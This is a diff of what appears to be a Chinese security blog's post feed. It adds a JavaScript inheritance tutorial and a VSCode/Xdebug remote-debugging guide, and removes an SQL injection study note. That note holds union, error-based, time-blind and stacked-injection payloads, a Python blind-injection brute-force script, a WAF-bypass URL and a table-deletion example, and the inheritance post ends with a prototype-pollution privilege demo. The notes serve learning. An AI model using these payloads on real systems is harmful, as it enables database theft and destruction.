+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">TheFather</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> a = <span class="number">1</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">private_1</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="built_in">console</span>.log(<span class="string">"I am private!"</span>);</span><br><span class="line">		<span class="keyword">return</span> a;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">son1</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">let</span> b = <span class="number">2</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">private_1</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="built_in">console</span>.log(<span class="string">"I am private!"</span>);</span><br><span class="line">		<span class="keyword">return</span> b;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">son1.prototype = <span class="keyword">new</span> TheFather;</span><br><span class="line">son1.prototype.constructor = son1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> test1 = <span class="keyword">new</span> TheFather;</span><br><span class="line"><span class="comment">//console.log(test1.a); //undefined</span></span><br><span class="line"><span class="comment">//console.log(test1.private_1()); //error</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> test2 = <span class="keyword">new</span> son1;</span><br><span class="line"><span class="comment">//console.log(test2.a); //undefined</span></span><br><span class="line"><span class="comment">//console.log(test2.private_1()); //error</span></span><br><span class="line"><span class="comment">//console.log(test2.private_2()); //error</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="public"><a href="#public" class="headerlink" title="public"></a>public</h2><p>对于public对象，它是可以被外部访问，也可以被继承的。<br>我们只需要用this就可以了</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">TheFather</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.a = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.public_1 = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">TheFather.prototype.public_2 = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">son1</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.b = <span class="number">2</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">this</span>.public_3 = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">son1.prototype = <span class="keyword">new</span> TheFather;</span><br><span class="line">son1.prototype.constructor = son1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> test1 = <span class="keyword">new</span> TheFather;</span><br><span class="line"><span class="comment">//console.log(test1.a); //1</span></span><br><span class="line"><span class="comment">//console.log(test1.public_1()); //1</span></span><br><span class="line"><span class="comment">//console.log(test1.public_2()); //1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> test2 = <span class="keyword">new</span> son1;</span><br><span class="line"><span class="comment">//console.log(test2.a); //1</span></span><br><span class="line"><span class="comment">//console.log(test2.b); //2</span></span><br><span class="line"><span class="comment">//console.log(test2.public_1()); //1</span></span><br><span class="line"><span class="comment">//console.log(test2.public_2()); //1</span></span><br><span class="line"><span class="comment">//console.log(test2.public_3()); //2</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="prototype"><a href="#prototype" class="headerlink" title="prototype"></a>prototype</h2><p>对于prototype，我们要让只有实例化的对象和子类的对象可以访问它。<br>我们没有具体实现的方法，可以将private属性变得可以访问即可。可以使用一个公用函数访问它。</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">TheFather</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> a = <span class="number">1</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">this</span>.private_1 = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> a;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">son1</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">let</span> b = <span class="number">2</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">this</span>.private_2 = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> b;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">son1.prototype = <span class="keyword">new</span> TheFather;</span><br><span class="line">son1.prototype.constructor = son1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> test1 = <span class="keyword">new</span> TheFather;</span><br><span class="line"><span class="comment">//console.log(test1.a); //undefined</span></span><br><span class="line"><span class="comment">//console.log(test1.private_1()); //1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> test2 = <span class="keyword">new</span> son1;</span><br><span class="line"><span class="comment">//console.log(test2.a); //undefined</span></span><br><span class="line"><span class="comment">//console.log(test2.private_1()); //error</span></span><br><span class="line"><span class="comment">//console.log(test2.private_2()); //error</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h1><p>因为js的对象继承是基于原型链的，所以如果把上一层的原型污染了就会导致下层的属性被污染。<br>举个例子</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//判断是否为一个对象</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isObject</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">typeof</span>(a) == <span class="string">"object"</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//对象复制</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">merge</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> attr <span class="keyword">in</span> b) &#123;</span><br><span class="line">        <span class="keyword">if</span>(isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123;</span><br><span class="line">            merge(a[attr], b[attr]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            a[attr] = b[attr];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//user父级对象，有一个判断是否为admin的属性</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">user</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.IsAdmin = <span class="literal">false</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//游客对象，继承user，IsAdmin默认为False</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">guest</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.check = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"I am guest"</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br><span class="line">guest.prototype = <span class="keyword">new</span> user;</span><br><span class="line"></span><br><span class="line"><span class="comment">//管理员对象，继承user，IsAdmin修改为True</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">admin</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.check = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"I am admin"</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br><span class="line">admin.prototype = <span class="keyword">new</span> user;</span><br><span class="line">admin.prototype.IsAdmin = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> P1 = <span class="keyword">new</span> guest;</span><br><span class="line"><span class="keyword">let</span> P2 = <span class="keyword">new</span> admin;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(P1.IsAdmin); <span class="comment">//false</span></span><br><span class="line"><span class="built_in">console</span>.log(P2.IsAdmin); <span class="comment">//true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//假设这里可以控制json，提交以下数据污染原型user</span></span><br><span class="line"><span class="keyword">let</span> o1 = <span class="built_in">JSON</span>.parse(<span class="string">'&#123;"__proto__":&#123;"IsAdmin":true&#125;&#125;'</span>);</span><br><span class="line">merge(P1, o1);</span><br><span class="line"><span class="built_in">console</span>.log(P1.IsAdmin); <span class="comment">//true</span></span><br></pre></td></tr></table></figure>]]></content>
+      <tags>
+        <tag>javascipt</tag>
+        <tag>对象</tag>
+        <tag>继承</tag>
+        <tag>原型链污染</tag>
+      </tags>
   </entry>
   <entry>
-    <title>SQL注入笔记</title>
-    <url>/2020/02/24/SQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/</url>
-    <content><![CDATA[<h1 id="SQL注入笔记"><a href="#SQL注入笔记" class="headerlink" title="SQL注入笔记"></a>SQL注入笔记</h1><p>这里是我的SQL注入笔记，绝赞更新中！欢迎批评斧正！</p>
-<p>[TOC]</p>
-<h2 id="普通注入-amp-amp-基础命令"><a href="#普通注入-amp-amp-基础命令" class="headerlink" title="普通注入&amp;&amp;基础命令"></a>普通注入&amp;&amp;基础命令</h2><h3 id="常用查库、表指令"><a href="#常用查库、表指令" class="headerlink" title="常用查库、表指令"></a>常用查库、表指令</h3><pre><code>查库： select schema_name from information_schema.schemata &lt;==&gt; show databases
+    <title>记一次远程调试</title>
+    <url>/2020/07/09/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><del>docker for windows就是一个**(无能狂怒)，</del>想build一个环境复现，结果build不起来，无奈使用vps上的docker for linux进行远程调试。这里记录一下如何进行远程调试。</p>
+<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[win10]-①-&gt;[debian8-②-&gt;[docker]]</span><br></pre></td></tr></table></figure>
+<p>本地环境为win10系统，使用vscode。<br>远程环境为debian8，拥有公网，开启一个docker容器暴露80端口</p>
+<h1 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h1><p>选择使用ssh作为第①步的链接<br>首先为vscode安装Remote-SSH扩展</p>
+<p><img src="https://s1.ax1x.com/2020/07/09/UeFICF.png" alt=""></p>
+<p>安装完毕后，右侧栏会多出一个显示器一样的图标，点进后添加链接</p>
+<p><img src="https://s1.ax1x.com/2020/07/09/UekN24.png" alt=""></p>
+<p>之后进行设置<br><code>设置 =&gt; 用户 =&gt; 扩展 =&gt; Remote-SSH =&gt; [Config file &amp; Show Login Terminal]</code></p>
+<p>将自己的ssh config file的path填入config file中，虽然vscode会自动寻找config file，但容易出错。<br>出错的原因应该是环境变量设置有问题，但我乱七八糟的环境变量太多了，懒得搞了=。=</p>
+<p>之后选上Show Login Terminal选项，可以在终端显示密码的输入提示。虽然可以使用公匙登录，但因为windows的权限设置，如果公匙文件的权限没有严格锁死的话是不允许使用的。所以懒癌发作（</p>
+<p>之后按照vscode的提示设置就好<br>成功连接后，我们就相当于在远程服务器的本地进行操纵了。</p>
+<h1 id="launch-json"><a href="#launch-json" class="headerlink" title="launch.json"></a>launch.json</h1><p>接下来对php进行远程Debug<br>因为php环境是使用Docker环境搭建的，所以在填写launch.json时仍然需要按照远程环境的方法填写。</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"version"</span>: <span class="string">"0.2.0"</span>,</span><br><span class="line">    <span class="attr">"configurations"</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">"name"</span>: <span class="string">"Listen for XDebug"</span>,</span><br><span class="line">            <span class="attr">"type"</span>: <span class="string">"php"</span>,</span><br><span class="line">            <span class="attr">"request"</span>: <span class="string">"launch"</span>,</span><br><span class="line">            <span class="attr">"port"</span>: <span class="number">9000</span>, <span class="comment">//Xdebug的端口</span></span><br><span class="line">            <span class="attr">"stopOnEntry"</span>: <span class="literal">true</span>, <span class="comment">//程序一进入就暂停，个人喜好，可以去掉</span></span><br><span class="line">            <span class="attr">"pathMappings"</span>: &#123; <span class="comment">//远程文件对本地文件的映射</span></span><br><span class="line">                <span class="attr">"/www"</span>: <span class="string">"$&#123;workspaceRoot&#125;"</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-查表：select table_name from information_schema.tables where table_schema=0x7365637572697479(库名)    //&apos;security&apos;
+<h1 id="xdebug-ini"><a href="#xdebug-ini" class="headerlink" title="xdebug.ini"></a>xdebug.ini</h1><p>接下来填写xdebug.ini<br>因为其使用在docker环境，所以有一个专用的host——<code>host.docker.internal</code>来访问到宿主主机</p>
+<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">zend_extension</span>=xdebug.so</span><br><span class="line"><span class="section">[XDebug]</span></span><br><span class="line"><span class="comment">;开启调试</span></span><br><span class="line"><span class="attr">xdebug.remote_enable</span> = <span class="literal">on</span></span><br><span class="line"></span><br><span class="line"><span class="comment">;详见https://xdebug.org/docs/remote#remote_autostart</span></span><br><span class="line"><span class="attr">xdebug.remote_autostart</span> = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">;docker特有，指向宿主主机</span></span><br><span class="line"><span class="comment">;2020-7-13更新</span></span><br><span class="line"><span class="comment">;host.docker.internal必然是有对应的host才生效</span></span><br><span class="line"><span class="comment">;但使用debian的镜像时DNS文件有问题，无法解析</span></span><br><span class="line"><span class="comment">;可以尝试172.19.0.1</span></span><br><span class="line"><span class="attr">xdebug.remote_host</span> = host.docker.internal</span><br><span class="line"><span class="attr">xdebug.remote_handler</span> = dbgp</span><br><span class="line"></span><br><span class="line"><span class="comment">;宿主监听的port</span></span><br><span class="line"><span class="attr">xdebug.remote_port</span> = <span class="number">9000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">;将请求来源的ip作为debug响应地址，这里地址可以确切获得就罢了</span></span><br><span class="line"><span class="attr">xdebug.remote_connect_back</span> = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">;ide的关键字，这里时VSCODE</span></span><br><span class="line"><span class="attr">xdebug.idekey</span> = VSCODE</span><br><span class="line"><span class="attr">xdebug.auto_trace</span> = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">;是否跟踪导入的文件名</span></span><br><span class="line"><span class="attr">xdebug.collect_includes</span> = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="attr">xdebug.collect_params</span> = <span class="number">1</span></span><br><span class="line"><span class="attr">xdebug.remote_log</span> = /tmp/xdebug.log</span><br></pre></td></tr></table></figure>
 
-查列：select column_name from information_schema.columns where table_name=&apos;~~~~&apos;;    //column 列；栏
-
-查字段：select (column1),(column2) from (表名).(列名);</code></pre><p>其中schema_name;table_name;column_name…可视为一种全局变量;</p>
-<h3 id="concat-函数、ordor-by"><a href="#concat-函数、ordor-by" class="headerlink" title="concat()函数、ordor by"></a>concat()函数、ordor by</h3><p>有时查列或表一次性无法显示全，就用group_concat()包住上列全局变量;<br>group_concat()的作用是将所有数据拼接为1行显示，详细可查看concat函数介绍;</p>
-<p>order by指令原本用于排序，但在注入中可以用于确定列数；<br>假定某表有3列；</p>
-<pre><code>/?id=1&apos; order by 1;--&gt;成功
-/?id=1&apos; order by 2;--&gt;成功
-/?id=1&apos; order by 3;--&gt;成功
-/?id=1&apos; order by 4;--&gt;失败</code></pre><p>故此表有三列;<br>limit (起始序号(0开始)),(展示行数);<br>待补充…</p>
-<h3 id="不常用全局变量"><a href="#不常用全局变量" class="headerlink" title="不常用全局变量"></a>不常用全局变量</h3><pre><code>select system_user()&lt;==&gt;user()    //展示系统用户
-
-select database()            //展示数据库名
-
-select version()            //展示版本信息
-
-select @@datadir            //展示数据储存路径
-
-select @@version_compile_os    //展示服务器系统</code></pre><h3 id="为什么会有1-2-select…"><a href="#为什么会有1-2-select…" class="headerlink" title="为什么会有1,2,select…"></a>为什么会有1,2,select…</h3><p>类似于（union selcet 1,2,<del>#）的缘故:<br>上例是确定了此表有三列，为想要的数据得到展示，选择第三列来显示;<br>当如（union 1,selcet ~</del>,3#）时数据会出现在第二列;</p>
-<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="XPath语法错误注入"><a href="#XPath语法错误注入" class="headerlink" title="XPath语法错误注入"></a>XPath语法错误注入</h3><h4 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h4><p>extractvalue()：从目标XML中返回包含所查询值的字符串。<br>EXTRACTVALUE (XML_document, XPath_string);<br>第一个参数：XML_document是String格式，为XML文档对象的名称<br>第二个参数：XPath_string (Xpath格式的字符串)<br>concat:返回结果为连接参数产生的字符串。<br>当我们在XPath_string故意填入错误的XPath时，在回显报错的同时会执行XPath的sql语句。<br>可根据此函数进行报错注入</p>
-<pre><code>// 这里是为了绕过空格的检测，所以用()把所有的东西包裹起来
-// 0x7e是“~”，是sql的一元运算符，可以防止在回显的时候不回显第一组数据
-// 可以的话想用0x5e“^”也可以...
-extractvalue(NULL,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables))))#
-extractvalue(NULL,concat(0x7e,(select(group_concat(schema_name))from(information_schema.schemata))))#</code></pre><h4 id="UPDATEXML"><a href="#UPDATEXML" class="headerlink" title="UPDATEXML()"></a>UPDATEXML()</h4><p>UPDATEXML (XML_document, XPath_string, new_value);<br>第一个参数：XML_document是String格式，为XML文档对象的名称<br>第二个参数：XPath_string (Xpath格式的字符串)<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据<br>和上面同理，但需要多加一个NULL</p>
-<h3 id="整型溢出错误注入（SQL-lt-5-5-53）"><a href="#整型溢出错误注入（SQL-lt-5-5-53）" class="headerlink" title="整型溢出错误注入（SQL&lt;5.5.53）"></a>整型溢出错误注入（SQL&lt;5.5.53）</h3><pre><code>select ~0;
-&gt;&gt;&gt; 18446744073709551615</code></pre><p>这里我们对0进行了取反，导致数据溢出</p>
-<pre><code>select !(select * from (select user())x);
-&gt;&gt;&gt; 1</code></pre><p>当一条语句执行成功时，返回0。因此非一下就变成了“1”.</p>
-<pre><code>select exp(710);
-&gt;&gt;&gt; ERROR 1690 (22003): DOUBLE value is out of range in &apos;exp(710)&apos;</code></pre><p>这里exp()计算自然指数。到了710就已经溢出了，我们尝试：</p>
-<pre><code>select exp(~(select*from(select user())x));
-&gt;&gt;&gt; DOUBLE value is out of range in &apos;exp(~((select &apos;root@localhost&apos; from dual)))&apos;</code></pre><p>虽然报错，但成功返回用户信息。以此来注入。</p>
-<h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><h3 id="时间盲注-1"><a href="#时间盲注-1" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>在时间盲注中共使用了4个比较重要的语句：</p>
-<pre><code>sleep(s);         # 将语句延迟s秒
-if(a,b,c);         # 如果a语句成立，执行b，否则执行c
-ascii(a);        # 将语句a的字符转换为ascii(十进制)
-substr(a,b,c);    # 将a的语句，从b(num)的位置开始，截取c(num)个字符</code></pre><p>我们将其一个一个结合起来就可以得到：</p>
-<pre><code>select if((ascii(substr((select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),?,1))=?),sleep(5),1);
-# 一一拆分对应
-select if(@a,sleep(5),1)     #如果@a语句成立，执行sleep(5)，否则返回1
-@a=(ascii(@b)=?)            #判断ascii后的@b是否等于?中的数字
-@b=substr(@c,?,1)            #从?处开始，截取@c语句中的1个字符
-@c=(select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database())     #查表语句，可以变换为查列，查字段的语句</code></pre><p>由此，我们可以实现爆破来获得信息<br>这里来一个python脚本(版本&gt;3.0)（十分臃肿</p>
-<pre><code>import requests
-
-mode = input(&quot;plz input use mode:&quot;)
-# T查表 C查列 F查字段
-while(True):
-    if(mode == &apos;T&apos;):
-        payload = &apos;select if((ascii(substr((select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),%s,1))=%s),sleep(5),1)&apos;
-        break
-
-    elif(mode == &apos;C&apos;):
-        tab = input(&apos;plz input tables_name:&apos;)
-        payload = &apos;select if((ascii(substr((select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME=0x&apos;+tab.encode(&apos;UTF-8&apos;).hex()+&apos;),%s,1)))=%s,sleep(5),1)&apos;
-        break
-
-    elif(mode == &apos;F&apos;):
-        tab = input(&apos;plz input tables_name:&apos;)
-        col = input(&apos;plz input col_name:&apos;)
-        payload = &apos;select if((ascii(substr((select &apos;+ col +&apos; from &apos;+ tab +&apos; limit 0,1),%s,1))=%s),sleep(5),1)&apos;
-        break
-
-    elif(mode != &apos;F&apos;|&apos;C&apos;|&apos;T&apos;):
-        print(&apos;Error&apos;)
-
-url = &apos;http://114514.com/FAQ.php&apos;
-res = &apos;&apos;
-sel_num = input(&quot;plz input sel_num:&quot;)
-# 要查询的字符数
-
-for i in range(1,sel_num):
-    print(i)
-    for j in range(32,127):
-        print(chr(j))
-        now_payload = payload % (i,j)
-        try:
-            r = requests.post(url=url,data=now_payload,timeout=4.5)
-            # 这里视情况更改
-        except:
-            res += chr(j)
-print(res)</code></pre><h2 id="sql堆叠注入"><a href="#sql堆叠注入" class="headerlink" title="sql堆叠注入"></a>sql堆叠注入</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>在一定条件下，我们可以通过 “ ; ” 提前结束sql语句，并在后面跟上其它sql语句，得到执行。在myphpadmin我们便可以这样多句执行<br>比如：</p>
-<pre><code>$a = $_GET[&apos;a&apos;];
-$sql = &quot;SELECT * FROM users WHERE id=$id&quot;;</code></pre><p>在这里我们甚至可以构造：</p>
-<pre><code>$a = &quot;1;DELETE FROM users&quot;;</code></pre><p>将整个users表全部删除！可见其危害有多大<br>不过一般来说，这种注入的局限比较大…<br>可能数据库引擎不支持，权限不足等…都会导致注入失败，还有就是，结果不一定会有回显…<br>yysy,我刚开始我从字面意思以为是什么数据溢出的骚操作（</p>
-<h3 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h3><h4 id="sql预处理语句"><a href="#sql预处理语句" class="headerlink" title="sql预处理语句"></a>sql预处理语句</h4><p>在可以进行堆叠注入时，且像”select、or…“等重要语句被过滤时，可以使用sql预处理语句</p>
-<pre><code>SET @a=&quot;select * from users&quot;; #怎么说？设定了一个a变量
-PREPARE test FROM @a; #使test=@a
-EXECUTE test; #加载test语句</code></pre><p>这样，我们就可以执行@a所设定的语句<br>再来，我们将我们的@a所设定的语句转换为hex，即可绕过大多数的waf<br>这里，我们尝试：</p>
-<pre><code>http://114514.com/?id=1&apos;;SET+@a=0x73656C65637420736C656570283529;PREPARE+test+FROM+@a;EXECUTE+test;&quot;
-//select sleep(5);</code></pre><h2 id="bypass-information-schema"><a href="#bypass-information-schema" class="headerlink" title="bypass - information_schema"></a>bypass - information_schema</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>也不是什么奇技淫巧，只是有其它的类似于information_schema的东西可以用来替代。<br>这里先只给出payload，详细原理之后补上。不知其所以然是不行的。</p>
-<pre><code># 无自增id时
-select 1,2,group_concat(table_name)from sys.schema_table_statistics_with_buffer where table_schema=database();
-+---+---+-------------------------------+
-| 1 | 2 | group_concat(table_name)      |
-+---+---+-------------------------------+
-| 1 | 2 | users,emails,uagents,referers |
-+---+---+-------------------------------+
-
-# 有自增id时
-select 1,2,group_concat(table_name)from sys.schema_auto_increment_columns where table_schema=database()；
-+---+---+-------------------------------+
-| 1 | 2 | group_concat(table_name)      |
-+---+---+-------------------------------+
-| 1 | 2 | emails,referers,uagents,users |
-+---+---+-------------------------------+</code></pre><p><a href="https://www.anquanke.com/post/id/193512" target="_blank" rel="noopener">https://www.anquanke.com/post/id/193512</a><br>原作者说，可能还有更多方式，但我现在时间有限。之后再说。</p>
-<h2 id="as别名的无列名注入"><a href="#as别名的无列名注入" class="headerlink" title="as别名的无列名注入"></a>as别名的无列名注入</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>通过as和虚拟表来使数据导入至虚拟表并赋予别名，以此在不知道列名的状况下，通过别名窃取到数据。</p>
-<h3 id="as语句"><a href="#as语句" class="headerlink" title="as语句"></a>as语句</h3><p>要了解此注入先需要知道什么是as。<br>其实也简单，它就是为数据起了一个别名。<br>例如，我使用如下语句查询到了以下结果：</p>
-<pre><code>select * from users;
-+----+----------+------------+
-| id | username | password   |
-+----+----------+------------+
-|  1 | Dumb     | Dumb       |
-|  2 | Angelina | I-kill-you |
-|  3 | Dummy    | p@ssword   |
-|  4 | secure   | crappy     |
-|  5 | stupid   | stupidity  |
-|  6 | superman | genious    |
-|  7 | batman   | mob!le     |
-|  8 | admin    | admin      |
-|  9 | admin1   | admin1     |
-| 10 | admin2   | admin2     |
-| 11 | admin3   | admin3     |
-| 12 | dhakkan  | dumbo      |
-| 14 | admin4   | admin4     |
-+----+----------+------------+</code></pre><p>这时候，可能有人不懂洋文(比如我)，这时候我们可以用as语句进行转换：</p>
-<pre><code>select id as 编号,username as 用户名,password as 密码 from users;
-+--------+-----------+------------+
-| 编号    |  用户名    | 密码       |
-+--------+-----------+------------+
-|      1 | Dumb      | Dumb       |
-|      2 | Angelina  | I-kill-you |
-|      3 | Dummy     | p@ssword   |
-|      4 | secure    | crappy     |
-|      5 | stupid    | stupidity  |
-|      6 | superman  | genious    |
-|      7 | batman    | mob!le     |
-|      8 | admin     | admin      |
-|      9 | admin1    | admin1     |
-|     10 | admin2    | admin2     |
-|     11 | admin3    | admin3     |
-|     12 | dhakkan   | dumbo      |
-|     14 | admin4    | admin4     |
-+--------+-----------+------------+</code></pre><p>可以发现，id、username、password都变成了中文。</p>
-<h3 id="无列名查询"><a href="#无列名查询" class="headerlink" title="无列名查询"></a>无列名查询</h3><p>但需要注意的是，这并不是在原表修改的，而是产生了一张虚拟表。这使得我们可以不用查列名即可获得数据。这就让我们可以干一些奇怪的事情。<br>注意，这里需要知道表的列数(其实也容易获取)</p>
-<pre><code>select 1,2,3 as c;
-# 获得了一张虚拟表，最后列名是c
-+---+---+---+
-| 1 | 2 | c |
-+---+---+---+
-| 1 | 2 | 3 |
-+---+---+---+
-
-select 1,2,3 as c union select * from users;
-# 我们发现原有的列名被替换了
-+----+----------+------------+
-| 1  | 2        | c          |
-+----+----------+------------+
-|  1 | 2        | 3          |
-|  1 | Dumb     | Dumb       |
-|  2 | Angelina | I-kill-you |
-|  3 | Dummy    | p@ssword   |
-|  4 | secure   | crappy     |
-|  5 | stupid   | stupidity  |
-|  6 | superman | genious    |
-|  7 | batman   | mob!le     |
-|  8 | admin    | admin      |
-|  9 | admin1   | admin1     |
-| 10 | admin2   | admin2     |
-| 11 | admin3   | admin3     |
-| 12 | dhakkan  | dumbo      |
-| 14 | admin4   | admin4     |
-+----+----------+------------+
-
-# 这时候，我们就可以对这个虚拟表干一些奇怪的事情
-select group_concat(c) from (select 1,2,3 as c union select * from users) as b;
-# 这里是又建立了另一个表，让他查询我们之前导入了数据的虚拟表，便可以提出数据
-# 注意，新表一定要起别名，不然会报错(指上面的as b)
-# 这个太长了，我就在下面放图片了</code></pre><p><img src="https://www.afkl.ml/usr/uploads/2020/02/531845518.png" alt="getc.PNG" title="getc.PNG"></p>
+<h1 id="Dockerfile"><a href="#Dockerfile" class="headerlink" title="Dockerfile"></a>Dockerfile</h1><p>在设置dockerfile或者docker-compose的端口时，不必将容器内部的9000端口暴露<br>因为xdebug的本质是由ide来开放9000端口接受xdebug的请求，所以暴露容器的9000端口没有用=。=</p>
+<h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>享受你的debug时光吧！（（（<br><img src="https://s1.ax1x.com/2020/07/09/UeFhNT.png" alt=""></p>
 ]]></content>
+      <tags>
+        <tag>debug</tag>
+        <tag>php</tag>
+        <tag>ssh</tag>
+        <tag>docker</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>php框架入门</title>
+    <url>/2020/11/15/php%E6%A1%86%E6%9E%B6%E5%85%A5%E9%97%A8/</url>
